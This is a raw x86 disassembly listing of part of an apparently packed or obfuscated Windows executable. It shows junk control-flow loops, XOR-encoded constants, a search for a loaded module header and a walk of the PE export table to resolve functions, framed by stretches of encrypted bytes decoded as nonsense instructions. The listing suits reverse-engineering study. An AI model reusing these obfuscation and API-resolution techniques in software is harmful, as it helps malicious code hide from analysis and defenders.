  40a213:	sub    DWORD PTR [esi],edi
  40a215:	dec    esp
  40a216:	in     al,0xf
  40a218:	repz call DWORD PTR [edi]
  40a21b:	jno    0x40a247
  40a21d:	dec    esi
  40a21e:	test   eax,0x9221a239
  40a223:	stos   BYTE PTR es:[edi],al
  40a224:	fdivr  QWORD PTR [eax+0x59]
  40a227:	push   es
  40a228:	inc    ecx
  40a229:	je     0x40a207
  40a22b:	mov    eax,0x451aa36d
  40a230:	cs cmc 
  40a232:	repz add bl,BYTE PTR [edx+0x5e282c81]
  40a239:	xchg   edi,eax
  40a23a:	aaa    
  40a23b:	stos   BYTE PTR es:[edi],al
  40a23c:	fistp  WORD PTR [ebp+0x17]
  40a23f:	mov    ecx,0xcf7bf822
  40a244:	scas   al,BYTE PTR es:[edi]
  40a245:	sar    DWORD PTR [esi+0x35],0xcd
  40a249:	sahf   
  40a24a:	pushf  
  40a24b:	fimul  WORD PTR [edi]
  40a24d:	int3   
  40a24e:	jo     0x40a21a
  40a250:	mov    eax,ds:0xd3f50c6d
  40a255:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a256:	cmp    BYTE PTR [eax+0xb],ch
  40a259:	lea    eax,[eax+edi*1+0x64e5c4]
  40a260:	mov    edi,DWORD PTR [ebp+0xc]
  40a263:	xor    edi,ecx
  40a265:	add    edi,edx
  40a267:	imul   eax,edi
  40a26a:	mov    edi,DWORD PTR [ebp+0xc]
  40a26d:	xor    edi,ecx
  40a26f:	sub    edi,eax
  40a271:	mov    eax,DWORD PTR [ebp-0x4]
  40a274:	add    edi,edx
  40a276:	cmp    DWORD PTR [eax],edi
  40a278:	mov    eax,DWORD PTR [ebp-0x4]
  40a27b:	mov    edi,DWORD PTR [ebp+0x10]
  40a27e:	jg     0x40a291
  40a284:	xor    edi,ecx
  40a286:	mov    ebx,esi
  40a288:	sub    ebx,edi
  40a28a:	add    DWORD PTR [eax],ebx
  40a28c:	jmp    0x40a297
  40a291:	xor    edi,ecx
  40a293:	add    edi,edx
  40a295:	add    DWORD PTR [eax],edi
  40a297:	mov    eax,DWORD PTR [ebp-0x8]
  40a29a:	mov    edi,DWORD PTR [ebp-0x10]
  40a29d:	mov    eax,DWORD PTR [eax]
  40a29f:	xor    edi,ecx
  40a2a1:	add    edi,0x3272e1
  40a2a7:	not    edi
  40a2a9:	and    eax,edi
  40a2ab:	movsx  di,BYTE PTR [eax+0x1]
  40a2b0:	mov    ebx,0x3b51
  40a2b5:	sub    di,bx
  40a2b8:	mov    ebx,0x8a8d
  40a2bd:	xor    di,bx
  40a2c0:	mov    ebx,0x4f84
  40a2c5:	cmp    di,bx
  40a2c8:	jne    0x40a2f0
  40a2ce:	movsx  di,BYTE PTR [eax]
  40a2d2:	mov    ebx,0x3b51
  40a2d7:	sub    di,bx
  40a2da:	mov    ebx,0x8a8d
  40a2df:	xor    di,bx
  40a2e2:	mov    ebx,0x4e71
  40a2e7:	cmp    di,bx
  40a2ea:	je     0x40a300
  40a2f0:	mov    edi,DWORD PTR [ebp-0x10]
  40a2f3:	xor    edi,ecx
  40a2f5:	mov    ebx,esi
  40a2f7:	sub    ebx,edi
  40a2f9:	add    eax,ebx
  40a2fb:	jmp    0x40a2ab
  40a300:	mov    esi,DWORD PTR [ebp-0x14]
  40a303:	mov    esi,DWORD PTR [esi]
  40a305:	mov    edi,DWORD PTR [eax+0x3c]
  40a308:	lea    esi,[edi+esi*8+0x78]
  40a30c:	mov    esi,DWORD PTR [esi+eax*1]
  40a30f:	mov    DWORD PTR [ebp-0x8],esi
  40a312:	mov    esi,DWORD PTR [ebp+0x8]
  40a315:	xor    esi,ecx
  40a317:	add    esi,edx
  40a319:	mov    DWORD PTR [ebp-0x14],esi
  40a31c:	mov    esi,DWORD PTR [ebp+0x8]
  40a31f:	mov    edi,DWORD PTR [ebp-0x8]
  40a322:	xor    esi,ecx
  40a324:	add    esi,edx
  40a326:	pop    ebx
  40a327:	cmp    edi,esi
  40a329:	jne    0x40a347
  40a32f:	mov    eax,DWORD PTR [ebp+0xc]
  40a332:	xor    eax,ecx
  40a334:	mov    ecx,DWORD PTR [ebp-0x8]
  40a337:	add    eax,edx
  40a339:	imul   eax,ecx
  40a33c:	mov    DWORD PTR [ebp-0x8],eax
  40a33f:	push   DWORD PTR [ebp+0x18]
  40a342:	jmp    0x40a39b
  40a347:	mov    ecx,DWORD PTR [ebp-0x8]
  40a34a:	add    ecx,eax
  40a34c:	mov    DWORD PTR [ebp-0x14],ecx
  40a34f:	mov    ecx,DWORD PTR [ebp-0x14]
  40a352:	mov    ecx,DWORD PTR [ecx+0xc]
  40a355:	movsx  cx,BYTE PTR [ecx+eax*1]
  40a35a:	mov    edx,0x3b51
  40a35f:	sub    cx,dx
  40a362:	mov    edx,0x8a8d
  40a367:	xor    cx,dx
  40a36a:	mov    edx,0x4e77
  40a36f:	cmp    cx,dx
  40a372:	jne    0x40a33f
  40a378:	mov    ecx,DWORD PTR ds:0x43a2d4
  40a37e:	mov    ecx,DWORD PTR [ecx+0x198]
  40a384:	mov    DWORD PTR [ecx],eax
  40a386:	jmp    0x40a3ac
  40a38b:	mov    ecx,DWORD PTR [ebp+0x18]
  40a38e:	cmp    ecx,0xf89c8584
  40a394:	jne    0x40a3ac
  40a39a:	push   eax
  40a39b:	push   DWORD PTR [ebp+0x14]
  40a39e:	push   DWORD PTR [ebp+0x10]
  40a3a1:	push   DWORD PTR [ebp+0xc]
  40a3a4:	push   DWORD PTR [ebp+0x8]
  40a3a7:	call   0x407a51
  40a3ac:	pop    edi
  40a3ad:	pop    esi
  40a3ae:	leave  
  40a3af:	ret    0x14
  40a3b2:	push   ebp
  40a3b3:	mov    ebp,esp
  40a3b5:	sub    esp,0xc
  40a3b8:	sbb    DWORD PTR ds:0x43701c,0x4790
  40a3c2:	push   esi
  40a3c3:	mov    DWORD PTR ds:0x435018,0x19
  40a3cd:	cmp    DWORD PTR ds:0x435018,0x0
  40a3d4:	je     0x40a404
  40a3da:	cmp    DWORD PTR ds:0x435018,0x1b
  40a3e1:	ja     0x40a404
  40a3e7:	jmp    0x40a3f2
  40a3ec:	call   DWORD PTR ds:0x43a8f0
  40a3f2:	mov    esi,DWORD PTR ds:0x435018
  40a3f8:	dec    esi
  40a3f9:	mov    DWORD PTR ds:0x435018,esi
  40a3ff:	jmp    0x40a3cd
  40a404:	mov    esi,0xf89c8585
  40a409:	not    DWORD PTR ds:0x436000
  40a40f:	mov    DWORD PTR [ebp-0x8],esi
  40a412:	mov    DWORD PTR [ebp-0x4],0xf89c8584
  40a419:	push   edi
  40a41a:	mov    eax,eax
  40a41c:	mov    edi,DWORD PTR ds:0x4165b4
  40a422:	mov    ecx,DWORD PTR ds:0x43900c
  40a428:	sub    ecx,edi
  40a42a:	imul   edi,DWORD PTR [edi+ecx*1]
  40a42e:	mov    eax,DWORD PTR [ebp-0x4]
  40a431:	mov    edi,DWORD PTR [ebp-0x8]
  40a434:	mov    ecx,0x751089b
  40a439:	movzx  edx,WORD PTR ds:0x43700c
  40a440:	or     DWORD PTR ds:0x438014,edx
  40a446:	xor    eax,ecx
  40a448:	adc    edx,0x57d4
  40a44e:	xor    edi,ecx
  40a450:	and    edx,0x6c30
  40a456:	mov    edx,0x3272e2
  40a45b:	add    DWORD PTR ds:0x435008,0x434004
  40a465:	add    edi,edx
  40a467:	sub    DWORD PTR ds:0x437008,0x434008
  40a471:	add    eax,edx
  40a473:	imul   eax,edi
  40a476:	mov    DWORD PTR ds:0x436014,edi
  40a47c:	mov    edi,DWORD PTR [ebp+0xc]
  40a47f:	cmp    edi,eax
  40a481:	je     0x40a549
  40a487:	and    eax,0xc4b
  40a48c:	mov    DWORD PTR [ebp-0xc],esi
  40a48f:	mov    esi,DWORD PTR ds:0x416528
  40a495:	mov    esi,DWORD PTR [esi]
  40a497:	sub    DWORD PTR ds:0x437018,esi
  40a49d:	mov    eax,DWORD PTR [ebp-0xc]
  40a4a0:	mov    DWORD PTR ds:0x435004,0x19
  40a4aa:	cmp    DWORD PTR ds:0x435004,0x0
  40a4b1:	je     0x40a500
  40a4b7:	cmp    DWORD PTR ds:0x435004,0x4
  40a4be:	jg     0x40a500
  40a4c4:	jmp    0x40a4d2
  40a4c9:	push   DWORD PTR [ebp-0x28]
  40a4cc:	call   DWORD PTR ds:0x43a8f4
  40a4d2:	cmp    DWORD PTR ds:0x435004,0x5
  40a4d9:	jne    0x40a4ee
  40a4df:	xor    esi,esi
  40a4e1:	or     esi,DWORD PTR ds:0x435004
  40a4e7:	dec    esi
  40a4e8:	mov    DWORD PTR ds:0x435004,esi
  40a4ee:	mov    esi,DWORD PTR ds:0x435004
  40a4f4:	dec    esi
  40a4f5:	mov    DWORD PTR ds:0x435004,esi
  40a4fb:	jmp    0x40a4aa
  40a500:	mov    esi,DWORD PTR [ebp+0xc]
  40a503:	xor    eax,ecx
  40a505:	lea    eax,[eax*8+0x1939788]
  40a50c:	mov    eax,DWORD PTR [esi+eax*1]
  40a50f:	mov    DWORD PTR [ebp+0xc],eax
  40a512:	mov    eax,DWORD PTR [ebp-0x4]
  40a515:	mov    esi,DWORD PTR [ebp-0x8]
  40a518:	xor    eax,ecx
  40a51a:	xor    esi,ecx
  40a51c:	add    esi,edx
  40a51e:	add    eax,edx
  40a520:	imul   eax,esi
  40a523:	mov    esi,DWORD PTR [ebp+0xc]
  40a526:	cmp    esi,eax
  40a528:	je     0x40a549
  40a52e:	mov    eax,DWORD PTR [ebp-0x4]
  40a531:	xor    eax,ecx
  40a533:	mov    ecx,DWORD PTR [ebp+0xc]
  40a536:	add    eax,edx
  40a538:	imul   eax,ecx
  40a53b:	add    eax,DWORD PTR [ebp+0x8]
  40a53e:	mov    DWORD PTR [ebp+0xc],eax
  40a541:	mov    eax,DWORD PTR [ebp+0xc]
  40a544:	jmp    0x40a55a
  40a549:	mov    eax,DWORD PTR [ebp-0x4]
  40a54c:	mov    esi,DWORD PTR [ebp-0x8]
  40a54f:	xor    esi,ecx
  40a551:	xor    eax,ecx
  40a553:	add    esi,edx
  40a555:	add    eax,edx
  40a557:	imul   eax,esi
  40a55a:	pop    edi
  40a55b:	pop    esi
  40a55c:	leave  
  40a55d:	ret    0x8
  40a560:	push   ebp
  40a561:	mov    ebp,esp
  40a563:	push   ecx
  40a564:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  40a56b:	mov    eax,DWORD PTR [ebp-0x4]
  40a56e:	and    DWORD PTR ds:0x434010,0x0
  40a578:	jmp    0x40a58a
  40a57d:	mov    ecx,DWORD PTR ds:0x434010
  40a583:	inc    ecx
  40a584:	mov    DWORD PTR ds:0x434010,ecx
  40a58a:	cmp    DWORD PTR ds:0x434010,0x19
  40a591:	jae    0x40a5d6
  40a597:	cmp    DWORD PTR ds:0x434010,0x9
  40a59e:	jge    0x40a5d6
  40a5a4:	jmp    0x40a5b7
  40a5a9:	push   0x55fe
  40a5ae:	push   DWORD PTR [ebp-0x18]
  40a5b1:	call   DWORD PTR ds:0x43a8f8
  40a5b7:	cmp    DWORD PTR ds:0x434010,0x8
  40a5be:	jne    0x40a5d1
  40a5c4:	mov    ecx,DWORD PTR ds:0x434010
  40a5ca:	inc    ecx
  40a5cb:	mov    DWORD PTR ds:0x434010,ecx
  40a5d1:	jmp    0x40a57d
  40a5d6:	mov    edx,DWORD PTR [ebp+0x10]
  40a5d9:	mov    ecx,0x751089b
  40a5de:	xor    eax,ecx
  40a5e0:	add    eax,0x3272e2
  40a5e5:	mov    DWORD PTR [edx],eax
  40a5e7:	mov    eax,DWORD PTR [ebp+0xc]
  40a5ea:	mov    DWORD PTR ds:0x438008,0x1d
  40a5f4:	cmp    DWORD PTR ds:0x438008,0x0
  40a5fb:	je     0x40a630
  40a601:	cmp    DWORD PTR ds:0x438008,0x1e
  40a608:	jl     0x40a630
  40a60e:	jmp    0x40a61e
  40a613:	push   0x434028
  40a618:	call   DWORD PTR ds:0x43a900
  40a61e:	mov    edx,DWORD PTR ds:0x438008
  40a624:	dec    edx
  40a625:	mov    DWORD PTR ds:0x438008,edx
  40a62b:	jmp    0x40a5f4
  40a630:	xor    eax,ecx
  40a632:	push   esi
  40a633:	mov    esi,DWORD PTR [ebp+0x10]
  40a636:	mov    edx,0x3272e2
  40a63b:	add    eax,edx
  40a63d:	mov    DWORD PTR [esi+0x4],eax
  40a640:	mov    eax,DWORD PTR [ebp+0x14]
  40a643:	mov    esi,DWORD PTR [ebp+0x10]
  40a646:	mov    DWORD PTR [esi+0x8],eax
  40a649:	mov    eax,DWORD PTR [ebp+0x18]
  40a64c:	mov    esi,DWORD PTR [ebp+0x10]
  40a64f:	mov    DWORD PTR [esi+0xc],eax
  40a652:	mov    eax,DWORD PTR [ebp+0x1c]
  40a655:	mov    esi,DWORD PTR [ebp+0x10]
  40a658:	mov    DWORD PTR [esi+0x10],eax
  40a65b:	mov    eax,DWORD PTR [ebp+0x8]
  40a65e:	xor    eax,ecx
  40a660:	add    eax,edx
  40a662:	pop    esi
  40a663:	leave  
  40a664:	ret    0x18
  40a667:	push   ebp
  40a668:	mov    ebp,esp
  40a66a:	sub    esp,0x9c
  40a670:	movzx  ecx,BYTE PTR ds:0x437000
  40a677:	xor    DWORD PTR ds:0x43401c,ecx
  40a67d:	mov    ecx,DWORD PTR [ebp+0x8]
  40a680:	mov    eax,0x8a8d
  40a685:	xor    ax,WORD PTR [ecx+0x20]
  40a689:	mov    ecx,0x3b51
  40a68e:	add    ax,cx
  40a691:	mov    ecx,DWORD PTR ds:0x436014
  40a697:	add    DWORD PTR ds:0x43801c,ecx
  40a69d:	movzx  eax,ax
  40a6a0:	mov    DWORD PTR [ebp-0x10],eax
  40a6a3:	mov    BYTE PTR [ebp-0x1],0x7d
  40a6a7:	sub    DWORD PTR ds:0x434028,edi
  40a6ad:	lea    eax,[ebp-0x1]
  40a6b0:	mov    DWORD PTR [ebp-0xc],eax
  40a6b3:	sub    ecx,0x54f4
  40a6b9:	mov    al,BYTE PTR [ebp-0x1]
  40a6bc:	add    DWORD PTR ds:0x434000,edx
  40a6c2:	mov    ecx,DWORD PTR [ebp-0xc]
  40a6c5:	and    DWORD PTR ds:0x434024,0x436014
  40a6cf:	xor    al,0x74
  40a6d1:	and    DWORD PTR ds:0x436008,0x1db4
  40a6db:	sub    al,0x8
  40a6dd:	or     DWORD PTR ds:0x434014,0x438000
  40a6e7:	mov    BYTE PTR [ecx],al
  40a6e9:	mov    DWORD PTR [ebp-0x18],0xf89c8585
  40a6f0:	and    DWORD PTR ds:0x437014,0x0
  40a6fa:	mov    eax,ds:0x437014
  40a6ff:	inc    eax
  40a700:	mov    ds:0x437014,eax
  40a705:	cmp    DWORD PTR ds:0x437014,0x24
  40a70c:	jl     0x40a72a
  40a712:	jmp    0x40a71d
  40a717:	call   DWORD PTR ds:0x43a904
  40a71d:	cmp    DWORD PTR ds:0x437014,0x1a
  40a724:	jb     0x40a6fa
  40a72a:	push   ebx
  40a72b:	and    DWORD PTR ds:0x43701c,0x0
  40a735:	jmp    0x40a749
  40a73a:	xor    ecx,ecx
  40a73c:	add    ecx,DWORD PTR ds:0x43701c
  40a742:	inc    ecx
  40a743:	mov    DWORD PTR ds:0x43701c,ecx
  40a749:	cmp    DWORD PTR ds:0x43701c,0x1b
  40a750:	jae    0x40a778
  40a756:	cmp    DWORD PTR ds:0x43701c,0x26
  40a75d:	ja     0x40a778
  40a763:	jmp    0x40a773
  40a768:	push   0x78f7
  40a76d:	call   DWORD PTR ds:0x43a8c4
  40a773:	jmp    0x40a73a
  40a778:	mov    DWORD PTR [ebp-0x8],0xf89c8584
  40a77f:	mov    DWORD PTR ds:0x434020,0x16
  40a789:	cmp    DWORD PTR ds:0x434020,0x0
  40a790:	je     0x40a7c3
  40a796:	cmp    DWORD PTR ds:0x434020,0x22
  40a79d:	jbe    0x40a7c3
  40a7a3:	jmp    0x40a7b0
  40a7a8:	push   0x2
  40a7aa:	call   DWORD PTR ds:0x43a8c8
  40a7b0:	xor    eax,eax
  40a7b2:	xor    eax,DWORD PTR ds:0x434020
  40a7b8:	dec    eax
  40a7b9:	mov    ds:0x434020,eax
  40a7be:	jmp    0x40a789
  40a7c3:	mov    ecx,DWORD PTR [ebp-0x18]
  40a7c6:	push   esi
  40a7c7:	and    esi,DWORD PTR ds:0x435010
  40a7cd:	mov    eax,0x751089b
  40a7d2:	xor    ecx,eax
  40a7d4:	mov    DWORD PTR ds:0x435008,0x1d
  40a7de:	cmp    DWORD PTR ds:0x435008,0x0
  40a7e5:	je     0x40a834
  40a7eb:	cmp    DWORD PTR ds:0x435008,0x7
  40a7f2:	jb     0x40a834
  40a7f8:	jmp    0x40a808
  40a7fd:	push   0x43a097
  40a802:	call   DWORD PTR ds:0x43a8d0
  40a808:	cmp    DWORD PTR ds:0x435008,0x8
  40a80f:	jne    0x40a822
  40a815:	mov    esi,DWORD PTR ds:0x435008
  40a81b:	dec    esi
  40a81c:	mov    DWORD PTR ds:0x435008,esi
  40a822:	mov    esi,DWORD PTR ds:0x435008
  40a828:	dec    esi
  40a829:	mov    DWORD PTR ds:0x435008,esi
  40a82f:	jmp    0x40a7de
  40a834:	mov    esi,0x3272e2
  40a839:	sub    DWORD PTR ds:0x43801c,0x434010
  40a843:	push   edi
  40a844:	and    DWORD PTR ds:0x436004,0x69e
  40a84e:	add    ecx,esi
  40a850:	mov    DWORD PTR ds:0x436004,0xf52
  40a85a:	jmp    0x40a87e
  40a85f:	mov    dl,BYTE PTR [ebp-0x1]
  40a862:	mov    DWORD PTR ds:0x43801c,0x56b6
  40a86c:	mov    BYTE PTR [ebp+ecx*1-0x9c],dl
  40a873:	mov    DWORD PTR ds:0x43701c,0x79a8
  40a87d:	inc    ecx
  40a87e:	cmp    ecx,0x40
  40a881:	mov    DWORD PTR ds:0x437010,0x2279
  40a88b:	jb     0x40a85f
  40a891:	and    DWORD PTR ds:0x43700c,0x0
  40a89b:	xor    edx,edx
  40a89d:	xor    edx,DWORD PTR ds:0x43700c
  40a8a3:	inc    edx
  40a8a4:	mov    DWORD PTR ds:0x43700c,edx
  40a8aa:	cmp    DWORD PTR ds:0x43700c,0x10
  40a8b1:	jbe    0x40a8ee
  40a8b7:	jmp    0x40a8c7
  40a8bc:	push   0x43a0f9
  40a8c1:	call   DWORD PTR ds:0x43a8d4
  40a8c7:	cmp    DWORD PTR ds:0x43700c,0xf
  40a8ce:	jne    0x40a8e1
  40a8d4:	mov    edx,DWORD PTR ds:0x43700c
  40a8da:	inc    edx
  40a8db:	mov    DWORD PTR ds:0x43700c,edx
  40a8e1:	cmp    DWORD PTR ds:0x43700c,0x1d
  40a8e8:	jb     0x40a89b
  40a8ee:	mov    edx,DWORD PTR [ebp-0x18]
  40a8f1:	and    DWORD PTR ds:0x43500c,0x435014
  40a8fb:	xor    edx,eax
  40a8fd:	adc    DWORD PTR ds:0x43700c,0x435014
  40a907:	add    edx,esi
  40a909:	jmp    0x40a9e8
  40a90e:	adc    ecx,edi
  40a910:	mov    edi,DWORD PTR [ebp+0x8]
  40a913:	mov    ecx,DWORD PTR ds:0x435018
  40a919:	sbb    DWORD PTR ds:0x43700c,ecx
  40a91f:	mov    ecx,0x8a8d
  40a924:	or     DWORD PTR ds:0x437014,0x2f73
  40a92e:	xor    cx,WORD PTR [edi+edx*4+0x2]
  40a933:	mov    edi,0x3b51
  40a938:	add    cx,di
  40a93b:	movzx  ecx,cx
  40a93e:	mov    DWORD PTR [ebp-0xc],ecx
  40a941:	and    DWORD PTR ds:0x434008,0x0
  40a94b:	mov    ecx,DWORD PTR ds:0x434008
  40a951:	inc    ecx
  40a952:	mov    DWORD PTR ds:0x434008,ecx
  40a958:	cmp    DWORD PTR ds:0x434008,0x6
  40a95f:	jg     0x40a99a
  40a965:	jmp    0x40a973
  40a96a:	push   DWORD PTR [ebp-0x20]
  40a96d:	call   DWORD PTR ds:0x43a8dc
  40a973:	cmp    DWORD PTR ds:0x434008,0x5
  40a97a:	jne    0x40a98d
  40a980:	mov    ecx,DWORD PTR ds:0x434008
  40a986:	inc    ecx
  40a987:	mov    DWORD PTR ds:0x434008,ecx
  40a98d:	cmp    DWORD PTR ds:0x434008,0x19
  40a994:	jb     0x40a94b
  40a99a:	mov    ecx,DWORD PTR [ebp+0x8]
  40a99d:	adc    DWORD PTR ds:0x437010,0x435000
  40a9a7:	movzx  ecx,WORD PTR [ecx+edx*4]
  40a9ab:	inc    DWORD PTR ds:0x437018
  40a9b1:	xor    ecx,0x8a8d
  40a9b7:	or     DWORD PTR ds:0x43701c,0x43800c
  40a9c1:	add    ecx,edi
  40a9c3:	mov    DWORD PTR ds:0x434004,ecx
  40a9c9:	mov    edi,DWORD PTR [ebp-0xc]
  40a9cc:	mov    DWORD PTR ds:0x435018,0x55c8
  40a9d6:	mov    BYTE PTR [ebp+edi*1-0x9c],cl
  40a9dd:	mov    DWORD PTR ds:0x43401c,0x7075
  40a9e7:	inc    edx
  40a9e8:	mov    ecx,DWORD PTR [ebp-0x10]
  40a9eb:	mov    DWORD PTR ds:0x437004,0x237b
  40a9f5:	cmp    edx,ecx
  40a9f7:	jne    0x40a90e
  40a9fd:	inc    ecx
  40a9fe:	mov    ecx,DWORD PTR [ebp-0x18]
  40aa01:	mov    DWORD PTR ds:0x43600c,0x12
  40aa0b:	cmp    DWORD PTR ds:0x43600c,0x0
  40aa12:	je     0x40aa56
  40aa18:	cmp    DWORD PTR ds:0x43600c,0x17
  40aa1f:	ja     0x40aa56
  40aa25:	jmp    0x40aa44
  40aa2a:	push   0x43a000
  40aa2f:	push   0x6abf
  40aa34:	push   0x7f73
  40aa39:	push   0x6111
  40aa3e:	call   DWORD PTR ds:0x43a8e0
  40aa44:	mov    edi,DWORD PTR ds:0x43600c
  40aa4a:	dec    edi
  40aa4b:	mov    DWORD PTR ds:0x43600c,edi
  40aa51:	jmp    0x40aa0b
  40aa56:	mov    edx,DWORD PTR [ebp+0x10]
  40aa59:	xor    ecx,eax
  40aa5b:	dec    edi
  40aa5c:	add    ecx,esi
  40aa5e:	add    edi,0x5bbd
  40aa64:	mov    DWORD PTR [edx],ecx
  40aa66:	xor    ecx,ecx
  40aa68:	or     ecx,DWORD PTR ds:0x439004
  40aa6e:	mov    edi,DWORD PTR ds:0x43901c
  40aa74:	sub    ecx,edi
  40aa76:	or     ecx,DWORD PTR [ecx+edi*1]
  40aa79:	mov    ecx,DWORD PTR [ebp-0x18]
  40aa7c:	sub    DWORD PTR ds:0x43400c,ecx
  40aa82:	xor    ecx,eax
  40aa84:	add    edi,DWORD PTR ds:0x436014
  40aa8a:	add    ecx,esi
  40aa8c:	or     DWORD PTR ds:0x43401c,0x72a8
  40aa96:	mov    DWORD PTR [ebp-0xc],ecx
  40aa99:	mov    DWORD PTR [ebp+0x8],0xf89c8585
  40aaa0:	and    DWORD PTR ds:0x434018,edi
  40aaa6:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  40aaad:	or     DWORD PTR ds:0x434024,0x436008
  40aab7:	mov    DWORD PTR [ebp-0x10],0xf89c9585
  40aabe:	and    DWORD PTR ds:0x436004,0x0
  40aac8:	mov    ecx,DWORD PTR ds:0x436004
  40aace:	inc    ecx
  40aacf:	mov    DWORD PTR ds:0x436004,ecx
  40aad5:	cmp    DWORD PTR ds:0x436004,0x1e
  40aadc:	ja     0x40ab14
  40aae2:	jmp    0x40ab07
  40aae7:	push   DWORD PTR [ebp-0x24]
  40aaea:	push   0x43401c
  40aaef:	push   DWORD PTR [ebp-0x20]
  40aaf2:	push   0x43a07b
  40aaf7:	push   0x8e91
  40aafc:	push   0x3182
  40ab01:	call   DWORD PTR ds:0x43a8e4
  40ab07:	cmp    DWORD PTR ds:0x436004,0x1b
  40ab0e:	jb     0x40aac8
  40ab14:	mov    ecx,DWORD PTR [ebp-0x14]
  40ab17:	mov    edi,DWORD PTR ds:0x416528
  40ab1d:	mov    edi,DWORD PTR [edi]
  40ab1f:	xor    DWORD PTR ds:0x434024,edi
  40ab25:	mov    DWORD PTR [ebp+0x8],ecx
  40ab28:	or     DWORD PTR ds:0x43600c,0x6978
  40ab32:	mov    ecx,DWORD PTR [ebp+0x8]
  40ab35:	xor    ecx,eax
  40ab37:	add    ecx,esi
  40ab39:	mov    ecx,0x242ebe9
  40ab3e:	mov    edi,0x3d76
  40ab43:	mov    edi,0xf641bea
  40ab48:	je     0x4163dd
  40ab4e:	mov    edx,DWORD PTR [ebp+0x8]
  40ab51:	mov    ebx,DWORD PTR [ebp-0x8]
  40ab54:	xor    edx,eax
  40ab56:	or     DWORD PTR ds:0x434020,0x43801c
  40ab60:	xor    ebx,eax
  40ab62:	sbb    DWORD PTR ds:0x434014,0x391d
  40ab6c:	sub    edx,ebx
  40ab6e:	and    DWORD PTR ds:0x43700c,0x5ff0
  40ab78:	sub    edx,esi
  40ab7a:	neg    ebx
  40ab7c:	xor    edx,eax
  40ab7e:	or     ebx,DWORD PTR ds:0x435018
  40ab84:	mov    DWORD PTR [ebp+0x8],edx
  40ab87:	dec    DWORD PTR ds:0x435004
  40ab8d:	mov    edx,DWORD PTR [ebp+0x8]
  40ab90:	mov    ebx,DWORD PTR [ebp-0x58]
  40ab93:	add    edx,0x5708c4
  40ab99:	imul   edx,ebx
  40ab9c:	mov    DWORD PTR [ebp-0x58],edx
  40ab9f:	mov    edx,DWORD PTR [ebp+0x8]
  40aba2:	mov    ebx,DWORD PTR [ebp-0x54]
  40aba5:	sub    DWORD PTR ds:0x434000,0x43800c
  40abaf:	add    edx,0x64f8da
  40abb5:	or     edx,ebx
  40abb7:	or     DWORD PTR ds:0x43600c,ebx
  40abbd:	mov    DWORD PTR [ebp-0x54],edx
  40abc0:	mov    edx,DWORD PTR [ebp+0x8]
  40abc3:	mov    ebx,DWORD PTR [ebp-0x50]
  40abc6:	jmp    0x40cf7a
  40abcb:	mov    ebp,0x9391ee60
  40abd0:	xchg   ebx,eax
  40abd1:	mov    ds:0x46f90650,eax
  40abd6:	(bad)  
  40abd7:	inc    DWORD PTR ss:0x7c060e8a
  40abde:	jl     0x40abcb
  40abe0:	pop    edi
  40abe1:	jl     0x40ac5f
  40abe3:	xchg   DWORD PTR ss:[edx],ebx
  40abe6:	in     al,0xcd
  40abe8:	rol    BYTE PTR [ebx+0x4a],cl
  40abeb:	sbb    eax,DWORD PTR [edi-0x142f66ac]
  40abf1:	rol    bl,1
  40abf3:	rol    ch,0xea
  40abf6:	jae    0x40ab7e
  40abf8:	sub    al,0x6c
  40abfa:	retf   
  40abfb:	imul   ebx,DWORD PTR [eax+0x14],0xdcd96ab0
  40ac02:	and    ah,BYTE PTR [ebx-0x51e7f99f]
  40ac08:	ins    BYTE PTR es:[edi],dx
  40ac09:	popf   
  40ac0a:	and    DWORD PTR [ebx+ebx*8],esi
  40ac0d:	push   cs
  40ac0e:	pop    esp
  40ac0f:	xor    al,BYTE PTR [esi+ebp*8+0x63500163]
  40ac16:	pop    es
  40ac17:	(bad)  
  40ac18:	mov    edx,0xb1582b3e
  40ac1d:	xor    ebx,ebp
  40ac1f:	push   eax
  40ac20:	inc    esp
  40ac21:	add    BYTE PTR [ecx+ebp*8+0x3440db07],0x40
  40ac29:	pusha  
  40ac2a:	popa   
  40ac2b:	lods   al,BYTE PTR ds:[esi]
  40ac2c:	add    ah,al
  40ac2e:	cmp    ebp,edx
  40ac30:	fs sub eax,0xfc079c17
  40ac36:	sbb    al,0x25
  40ac38:	test   BYTE PTR [ecx-0x2622ca7a],bl
  40ac3e:	mov    ah,0x55
  40ac40:	ret    
  40ac41:	out    dx,eax
  40ac42:	mov    dl,0x13
  40ac44:	jg     0x40ac27
  40ac46:	mov    ds:0x8f6b8f1e,eax
  40ac4b:	dec    ecx
  40ac4c:	(bad)  
  40ac4d:	fnstenv [edi+0x6e3b8392]
  40ac53:	mov    ebx,0x72a87038
  40ac58:	pop    es
  40ac59:	mov    bh,0x51
  40ac5b:	sti    
  40ac5c:	or     ah,BYTE PTR [eax+0x1997941]
  40ac62:	add    DWORD PTR [ecx-0x51],0x4e
  40ac66:	imul   ecx,DWORD PTR [esi+0x17c59066],0x836e803b
  40ac70:	pop    es
  40ac71:	scas   al,BYTE PTR es:[edi]
  40ac72:	retf   0x906a
  40ac75:	or     eax,0x7f22e228
  40ac7a:	or     al,0x1e
  40ac7c:	pop    ebx
  40ac7d:	add    BYTE PTR [ecx+0x54],0x2d
  40ac81:	outs   dx,BYTE PTR ds:[esi]
  40ac82:	mov    al,ds:0xd279f19
  40ac87:	push   0xad93c3aa
  40ac8c:	mov    cl,0x37
  40ac8e:	and    al,0xc
  40ac90:	fs scas al,BYTE PTR es:[edi]
  40ac92:	(bad)  
  40ac93:	inc    esi
  40ac94:	cmp    ebx,DWORD PTR [esi+0x49a22b81]
  40ac9a:	out    0xbb,eax
  40ac9c:	int    0x40
  40ac9e:	add    DWORD PTR [edi],edi
  40aca0:	add    DWORD PTR [ecx+eiz*4+0x5991afa1],eax
  40aca7:	adc    DWORD PTR [esi-0x7c],esp
  40acaa:	in     al,dx
  40acab:	add    eax,0x48f82b5d
  40acb0:	inc    ecx
  40acb1:	inc    esp
  40acb2:	xor    BYTE PTR [esi+0x381d9f8d],ah
  40acb8:	cs pop edi
  40acba:	scas   al,BYTE PTR es:[edi]
  40acbb:	lds    ecx,FWORD PTR [ecx]
  40acbd:	or     eax,DWORD PTR [esi-0x31]
  40acc0:	mov    bh,0x33
  40acc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40acc3:	ins    BYTE PTR es:[edi],dx
  40acc4:	inc    DWORD PTR [eax-0x57]
  40acc7:	jecxz  0x40ac58
  40acc9:	xor    BYTE PTR [ebx-0x10],dl
  40accc:	int    0x36
